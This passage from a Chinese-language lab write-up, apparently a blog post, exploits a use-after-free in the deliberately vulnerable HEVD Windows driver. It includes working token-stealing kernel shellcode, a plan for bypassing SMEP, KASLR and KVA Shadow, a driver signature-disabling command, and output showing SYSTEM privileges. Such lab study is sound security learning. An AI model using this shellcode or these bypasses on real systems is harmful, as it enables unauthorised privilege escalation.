+</span></span><span style="display:flex;"><span>    PoolWithTag[<span style="color:#bd93f9">4</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_OWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>UserFakeObject<span style="color:#ff79c6">-&gt;</span>Buffer[<span style="color:#bd93f9">64</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)PoolWithTag <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">10</span>) <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>UserFakeObject<span style="color:#ff79c6">-&gt;</span>Buffer[<span style="color:#bd93f9">80</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>((_DWORD <span style="color:#ff79c6">*</span>)PoolWithTag <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">22</span>) <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)<span style="color:#ff79c6">&amp;</span>UserFakeObject<span style="color:#ff79c6">-&gt;</span>Buffer[<span style="color:#bd93f9">88</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">*</span>((_BYTE <span style="color:#ff79c6">*</span>)PoolWithTag <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">91</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>    DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[+] Fake Object: 0x%p</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, PoolWithTag);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>i64;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    DbgPrintEx(<span style="color:#bd93f9">0x4Du</span>, <span style="color:#bd93f9">3u</span>, <span style="color:#f1fa8c">&#34;[-] Unable to allocate Pool chunk</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">3221225495</span>i64;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>打两个断点，成功写入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>3: kd&gt; dq 0xFFFFA78BF933D540
+</span></span><span style="display:flex;"><span>ffffa78b`f933d540  00000000`deadbeef 00000000`00000000
+</span></span><span style="display:flex;"><span>ffffa78b`f933d550  00000000`00000000 00000000`00000000
+</span></span><span style="display:flex;"><span>ffffa78b`f933d560  00000000`00000000 00000000`00000000
+</span></span><span style="display:flex;"><span>ffffa78b`f933d570  00000000`00000000 00000000`00000000
+</span></span><span style="display:flex;"><span>ffffa78b`f933d580  00000000`00000000 00000000`00000000
+</span></span><span style="display:flex;"><span>ffffa78b`f933d590  00000000`00000000 00000000`00000000
+</span></span><span style="display:flex;"><span>ffffa78b`f933d5a0  6b636148`02070000 00000000`00000000
+</span></span><span style="display:flex;"><span>ffffa78b`f933d5b0  00000000`deadbeef 00000000`00000000
+</span></span></code></pre></div><h4 id="shellcode-1">shellcode</h4>
+<p>使用keystone生成汇编</p>
+<p>或者参考<a href="https://github.com/vportal/HEVD/blob/main/HEVD_UAF_WIN10_21H2.cpp">HEVD/HEVD_UAF_WIN10_21H2.cpp</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>{ <span style="color:#bd93f9">0x65</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x8B</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x25</span>, <span style="color:#bd93f9">0x88</span>, <span style="color:#bd93f9">0x01</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x8B</span>, <span style="color:#bd93f9">0x80</span>, <span style="color:#bd93f9">0xB8</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x89</span>, <span style="color:#bd93f9">0xC3</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x8B</span>, <span style="color:#bd93f9">0x9B</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x81</span>, <span style="color:#bd93f9">0xEB</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x8B</span>, <span style="color:#bd93f9">0x8B</span>, <span style="color:#bd93f9">0x40</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x83</span>, <span style="color:#bd93f9">0xF9</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x75</span>, <span style="color:#bd93f9">0xE5</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x8B</span>, <span style="color:#bd93f9">0x8B</span>, <span style="color:#bd93f9">0xB8</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x80</span>, <span style="color:#bd93f9">0xE1</span>, <span style="color:#bd93f9">0xF0</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x89</span>, <span style="color:#bd93f9">0x88</span>, <span style="color:#bd93f9">0xB8</span>, <span style="color:#bd93f9">0x04</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x00</span>, <span style="color:#bd93f9">0x48</span>, <span style="color:#bd93f9">0x31</span>, <span style="color:#bd93f9">0xC0</span>, <span style="color:#bd93f9">0xC3</span> }
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// 反汇编
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span>  <span style="color:#bd93f9">65</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">8</span>b <span style="color:#bd93f9">04</span> <span style="color:#bd93f9">25</span> <span style="color:#bd93f9">88</span> <span style="color:#bd93f9">01</span>    mov    rax,QWORD PTR <span style="color:#8be9fd;font-style:italic">gs</span>:<span style="color:#bd93f9">0x188</span>  
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">7</span><span style="color:#ff79c6">:</span>  <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>  
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">9</span><span style="color:#ff79c6">:</span>  <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">8</span>b <span style="color:#bd93f9">80</span> b8 <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>    mov    rax,QWORD PTR [rax<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xb8</span>]  
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">10</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">89</span> c3                mov    rbx,rax  
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">13</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">8</span>b <span style="color:#bd93f9">9</span>b <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">04</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>    mov    rbx,QWORD PTR [rbx<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x448</span>]  
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1</span><span style="color:#8be9fd;font-style:italic">a</span>: <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">81</span> eb <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">04</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>    sub    rbx,<span style="color:#bd93f9">0x448</span>  
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">21</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">8</span>b <span style="color:#bd93f9">8</span>b <span style="color:#bd93f9">40</span> <span style="color:#bd93f9">04</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>    mov    rcx,QWORD PTR [rbx<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x440</span>]  
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">28</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">83</span> f9 <span style="color:#bd93f9">04</span>             cmp    rcx,<span style="color:#bd93f9">0x4</span>  
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2</span><span style="color:#8be9fd;font-style:italic">c</span>: <span style="color:#bd93f9">75</span> e5                   jne    <span style="color:#bd93f9">0x13</span>  
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">2</span><span style="color:#8be9fd;font-style:italic">e</span>: <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">8</span>b <span style="color:#bd93f9">8</span>b b8 <span style="color:#bd93f9">04</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>    mov    rcx,QWORD PTR [rbx<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x4b8</span>]
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">35</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">80</span> e1 f0                and    cl,<span style="color:#bd93f9">0xf0</span>  
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">38</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">89</span> <span style="color:#bd93f9">88</span> b8 <span style="color:#bd93f9">04</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>    mov    QWORD PTR [rax<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x4b8</span>],rcx  
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">3f</span><span style="color:#ff79c6">:</span> <span style="color:#bd93f9">48</span> <span style="color:#bd93f9">31</span> c0                xor    rax,rax  
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">42</span><span style="color:#ff79c6">:</span> c3                      ret
+</span></span></code></pre></div><p>是写成功了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>3: kd&gt; dq 0xFFFFDC04FE779850
+</span></span><span style="display:flex;"><span>ffffdc04`fe779850  00018825`048b4865 000000b8`808b4800
+</span></span><span style="display:flex;"><span>ffffdc04`fe779860  04489b8b`48c38948 000448eb`81480000
+</span></span><span style="display:flex;"><span>ffffdc04`fe779870  00000440`8b8b4800 8b48e575`04f98348
+</span></span><span style="display:flex;"><span>ffffdc04`fe779880  f0e18000`0004b88b 48000004`b8888948
+</span></span><span style="display:flex;"><span>ffffdc04`fe779890  00000000`00c3c031 00007ff7`85ad32d8
+</span></span><span style="display:flex;"><span>ffffdc04`fe7798a0  00000000`00000000 00000000`00413f2e
+</span></span><span style="display:flex;"><span>ffffdc04`fe7798b0  6b636148`02070000 61005400`00000000
+</span></span><span style="display:flex;"><span>ffffdc04`fe7798c0  00018825`048b4865 000000b8`808b4800
+</span></span></code></pre></div><p>但是直接写无法运行，无法提权：保护机制的绕过。</p>
+<h4 id="rop">ROP</h4>
+<p>bypass KASLR: 获取内核基址 <code>ntoskrnl.exe</code> 地址：遍历驱动，获取内核基址
+bypass SEMP/SMAP: 修改CR4寄存器，将20，21位置0
+bypass KVA Sahdow: 内核页表隔离KVA(KPTI)，也就是<a href="https://alvinovo.top/post/memory-page-table-isolation/#3-1-KVA-Shadow">KVA Shadow</a>，当执行内核代码时，用户态代码记录为 <code>NX</code></p>
+<ul>
+<li>AllocPoolWithTag 获得的内存一般是可执行的，因此可以往内存中写，然后执行</li>
+<li>执行<code>swapgs</code>绕过</li>
+</ul>
+<p>如果CR4寄存器的第20位被设置为1，那么就启用了SMEP；21位smap <a href="https://www.cnblogs.com/HcyRcer/p/16559321.html">Cr0-Cr4</a>。这里看到smep，smap都存在。SMEP存在就可以执行用户态代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>2: kd&gt; r cr4
+</span></span><span style="display:flex;"><span>cr4=0000000000350ef8
+</span></span><span style="display:flex;"><span>2: kd&gt; .formats cr4
+</span></span><span style="display:flex;"><span>Evaluate expression:
+</span></span><span style="display:flex;"><span>  Hex:     00000000`00350ef8
+</span></span><span style="display:flex;"><span>  Decimal: 3477240
+</span></span><span style="display:flex;"><span>  Decimal (unsigned) : 3477240
+</span></span><span style="display:flex;"><span>  Octal:   0000000000000015207370
+</span></span><span style="display:flex;"><span>  Binary:  00000000 00000000 00000000 00000000 00000000 00110101 00001110 11111000
+</span></span><span style="display:flex;"><span>  Chars:   .....5..
+</span></span><span style="display:flex;"><span>  Time:    Tue Feb 10 13:54:00 1970
+</span></span><span style="display:flex;"><span>  Float:   low 4.87265e-039 high 0
+</span></span><span style="display:flex;"><span>  Double:  1.71798e-317
+</span></span></code></pre></div><p>寻找ROP：使用ropper/ROPgadget工具，在 <code>ntoskrnl.exe</code> 寻找</p>
+<ul>
+<li><code>C:\Windows\WinSxS\amd64_microsoft-windows-os-kernelxxx\ntoskrnl.exe</code></li>
+</ul>
+<p>寻找gadget</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>(ntoskrnl.exe/PE/x86_64)&gt; imagebase 0x0
+</span></span><span style="display:flex;"><span>[INFO] Imagebase set to 0x0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>(ntoskrnl.exe/PE/x86_64)&gt; search mov cr4, r
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>参考：<a href="https://vulndev.io/2022/07/02/windows-kernel-exploitation-hevd-x64-stackoverflow/">Windows Kernel Exploitation x64 Stack Overflow </a>为了不崩溃，shellcode需要添加bypass KVA Shadow。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>[BITS <span style="color:#bd93f9">64</span>]
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">start</span>:
+</span></span><span style="display:flex;"><span>  mov rax, [<span style="color:#8be9fd;font-style:italic">gs</span>:<span style="color:#bd93f9">0x188</span>]       ; KPCRB.CurrentThread (_KTHREAD)
+</span></span><span style="display:flex;"><span>  mov rax, [rax <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xb8</span>]     ; APCState.Process (current _EPROCESS)
+</span></span><span style="display:flex;"><span>  mov r8, rax               ; Store current _EPROCESS ptr in RBX
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">loop</span>:
+</span></span><span style="display:flex;"><span>  mov r8, [r8 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x448</span>]      ; ActiveProcessLinks
+</span></span><span style="display:flex;"><span>  sub r8, <span style="color:#bd93f9">0x448</span>             ; Go back to start of _EPROCESS
+</span></span><span style="display:flex;"><span>  mov r9, [r8 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x440</span>]      ; UniqueProcessId (PID)
+</span></span><span style="display:flex;"><span>  cmp r9, <span style="color:#bd93f9">4</span>                 ; SYSTEM PID<span style="color:#ff79c6">?</span> 
+</span></span><span style="display:flex;"><span>  jnz loop                  ; Loop until PID <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">4</span>
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">replace</span>:
+</span></span><span style="display:flex;"><span>  mov rcx, [r8 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x4b8</span>]      ; Get SYSTEM token
+</span></span><span style="display:flex;"><span>  and cl, <span style="color:#bd93f9">0xf0</span>               ; Clear low <span style="color:#bd93f9">4</span> bits of _EX_FAST_REF structure
+</span></span><span style="display:flex;"><span>  mov [rax <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x4b8</span>], rcx     ; Copy SYSTEM token to current process
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">cleanup</span>:
+</span></span><span style="display:flex;"><span>  mov rax, [<span style="color:#8be9fd;font-style:italic">gs</span>:<span style="color:#bd93f9">0x188</span>]       ; _KPCR.Prcb.CurrentThread
+</span></span><span style="display:flex;"><span>  mov cx, [rax <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1e4</span>]     ; KTHREAD.KernelApcDisable
+</span></span><span style="display:flex;"><span>  inc cx
+</span></span><span style="display:flex;"><span>  mov [rax <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x1e4</span>], cx
+</span></span><span style="display:flex;"><span>  mov rdx, [rax <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x90</span>]     ; ETHREAD.TrapFrame
+</span></span><span style="display:flex;"><span>  mov rcx, [rdx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x168</span>]    ; ETHREAD.TrapFrame.Rip
+</span></span><span style="display:flex;"><span>  mov r11, [rdx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x178</span>]    ; ETHREAD.TrapFrame.EFlags
+</span></span><span style="display:flex;"><span>  mov rsp, [rdx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x180</span>]    ; ETHREAD.TrapFrame.Rsp
+</span></span><span style="display:flex;"><span>  mov rbp, [rdx <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x158</span>]    ; ETHREAD.TrapFrame.Rbp
+</span></span><span style="display:flex;"><span>  xor eax, eax  ;
+</span></span><span style="display:flex;"><span>  swapgs
+</span></span><span style="display:flex;"><span>  o64 sysret 
+</span></span></code></pre></div><p>某个地址读写，断点</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>kd&gt; ba e1 &lt;ObjectAddr&gt;
+</span></span></code></pre></div><p>最终结果</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>C:<span style="color:#8be9fd;font-style:italic">\Users\debugger</span><span style="color:#6272a4">&gt;C:\Users\debugger\Desktop\HEVDExploit.exe</span>
+</span></span><span style="display:flex;"><span>[*] Spray use write pipe
+</span></span><span style="display:flex;"><span>[*] Create UAF Object then free
+</span></span><span style="display:flex;"><span>[*] Prepare shellcode
+</span></span><span style="display:flex;"><span>[*] Spray to get the UAF object then write shellcode
+</span></span><span style="display:flex;"><span>[*] Trigger UAF callback
+</span></span><span style="display:flex;"><span>Microsoft Windows [版本 10.0.19045.3930]
+</span></span><span style="display:flex;"><span>(c) Microsoft Corporation。保留所有权利。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#8be9fd;font-style:italic">\Users\debugger</span><span style="color:#6272a4">&gt;whoami</span>
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><p>tip: kernel可以访问VirtualAlloc的内存区域，但是最好不允许换出内存。</p>
+<p>因为 NonPagedPool 是有可执行权限的😢</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>LPVOID pShellcode <span style="color:#ff79c6">=</span> VirtualAlloc(<span style="color:#8be9fd;font-style:italic">NULL</span>, <span style="color:#bd93f9">0x100</span>, MEM_COMMIT <span style="color:#ff79c6">|</span> MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+</span></span><span style="display:flex;"><span>RtlCopyMemory(pShellcode, StealToken, <span style="color:#bd93f9">0x100</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LPVOID pKernelStack <span style="color:#ff79c6">=</span> VirtualAlloc((LPVOID)stackAddr, <span style="color:#bd93f9">0x14000</span>, MEM_COMMIT <span style="color:#ff79c6">|</span> MEM_RESERVE, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>VirtualLock(pKernelStack, <span style="color:#bd93f9">0x14000</span>)) {
+</span></span><span style="display:flex;"><span>	Error(<span style="color:#f1fa8c">&#34;VirtualLock&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="update">update</h4>
+<p>因为这里的内存池是NonPagedPool，存在可执行权限，因此是可以写shellcode的</p>
+<p>参考的文章，池风水使用了NamedPipe，可能没什么用，因为NamedPipe在NonPagedPoolNx中获得，不是一个pool，因此没必要spray named pipe</p>
+<h3 id="exploit-nonpagedpoolnx">Exploit NonPagedPoolNx</h3>
+<p>没有执行权限</p>
+<p>NonPagedPool的exp也可以使用。</p>
+<p>其余做法：<a href="https://github.com/vportal/HEVD/blob/main/README.md">HEVD</a></p>
+<ul>
+<li>使用FakeObj来伪造一个NamedPipe，结合double free从而可以任意的读</li>
+<li>使用NtFsControlFile将NamedPipe改成unbuffered</li>
+<li>修改 Irp-&gt;SystemBuffer 任意写</li>
+</ul>
+<h2 id="qa">Q&amp;A</h2>
+<p>Windows 无法验证此设备所需的驱动程序的数字签名。某软件或硬件最近有所更改，可能安装了签名错误或损毁的文件，或者安装的文件可能是来路不明的恶意软件。</p>
+<ul>
+<li>更新与安全-&gt;恢复-&gt;高级启动-&gt;立刻重新启动-&gt;疑难解答-&gt;高级选项-&gt;禁用驱动强制签名（F7</li>
+</ul>
+<p>永久禁用驱动签名？不行？</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>bcdedit /set nointegritychecks on
+</span></span></code></pre></div><p>加载HEVD驱动，我们得先找到其驱动目录，因此我们可以创建目录，将pdb文件扔进去</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>0: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; !sym noisy</span>
+</span></span><span style="display:flex;"><span>noisy mode - symbol prompts on
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span># 显示符号
+</span></span><span style="display:flex;"><span>0: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; x /D HEVD!*</span>
+</span></span><span style="display:flex;"><span> A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SYMSRV:  BYINDEX: 0x8
+</span></span><span style="display:flex;"><span>         c:\symbols*https://msdl.microsoft.com/download/symbols
+</span></span><span style="display:flex;"><span>         HEVD.pdb
+</span></span><span style="display:flex;"><span>         1A8235FDCA7F46E08A07A47D79B5A8991
+</span></span><span style="display:flex;"><span>SYMSRV:  UNC: c:\symbols\HEVD.pdb\1A8235FDCA7F46E08A07A47D79B5A8991\HEVD.pdb - path not found
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="more">More</h2>
+<p>翻到了一篇CVE分析，其中利用到了token替换技术：<a href="https://bbs.kanxue.com/thread-277554.htm">CVE-2022-37969 漏洞利用</a>,一个优秀的利用对象：pipe</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>BOOL <span style="color:#50fa7b">CreatePipe</span>(
+</span></span><span style="display:flex;"><span>  [out]          PHANDLE               hReadPipe,
+</span></span><span style="display:flex;"><span>  [out]          PHANDLE               hWritePipe,
+</span></span><span style="display:flex;"><span>  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,
+</span></span><span style="display:flex;"><span>  [in]           DWORD                 nSize
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>会在内核空间创建 <code>PipeAttribute</code>，PipeAttribute结构是在<code>PagedPool</code>中分配的内核空间中属性的表示，构造后可以造成任意地址的读写</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">PipeAttribute</span> {
+</span></span><span style="display:flex;"><span>    LIST_ENTRY list ;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span> AttributeName;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">uint64_t</span> AttributeValueSize;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span> AttributeValue;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> data [<span style="color:#bd93f9">0</span>];
+</span></span><span style="display:flex;"><span> };
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_LIST_ENTRY</span> {
+</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_LIST_ENTRY</span> <span style="color:#ff79c6">*</span>Flink;
+</span></span><span style="display:flex;"><span>   <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_LIST_ENTRY</span> <span style="color:#ff79c6">*</span>Blink;
+</span></span><span style="display:flex;"><span> } LIST_ENTRY, <span style="color:#ff79c6">*</span>PLIST_ENTRY, PRLIST_ENTRY;
+</span></span></code></pre></div><p>因此可以不写汇编而达到steal token 的目的</p>
+<ul>
+<li>使用适当的参数调用<code>NtQuerySystemInformation</code> API获取当前进程和拥有SYSTEM特权的System进程（PID 4）的_EPROCESS和_TOKEN</li>
+<li>调用OpenProcessToken函数打开与当前进程关联的访问令牌</li>
+<li>根据漏洞替换token</li>
+</ul>
+<h2 id="参考文章">参考文章</h2>
+<ul>
+<li><a href="https://mdanilor.github.io/posts/">Posts (mdanilor.github.io)</a></li>
+<li><a href="https://paper.seebug.org/1743/">Scoop the Windows 10 pool !</a></li>
+<li><a href="https://bbs.kanxue.com/thread-276550.htm">win提权漏洞文章收集</a></li>
+<li><a href="https://xz.aliyun.com/t/13434?time__1311=mqmxnDBQqQq2D%2FD0Dx2DUrzLtg0D7uP%2BD&amp;alichlgref=https%3A%2F%2Fxz.aliyun.com%2F">Windows内核利用小总结</a></li>
+<li><a href="https://www.alex-ionescu.com/?p=231">Sheep Year Kernel Heap Fengshui</a></li>
+<li><a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/">Sheep Year Kernel Heap Fengshui: Spraying in the Big Kids’ Pool</a></li>
+</ul>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			<nav class="nav tags">
+				<ul class="tags">
+					
+					<li><a href="/tags/hevd">HEVD</a></li>
+					
+				</ul>
+			</nav>
+			
+			
+		</div>
+		<div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        var disqus_shortname = 'ldrx30';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+
+</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/ldrx30" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2024  © ldrx30 |  <a
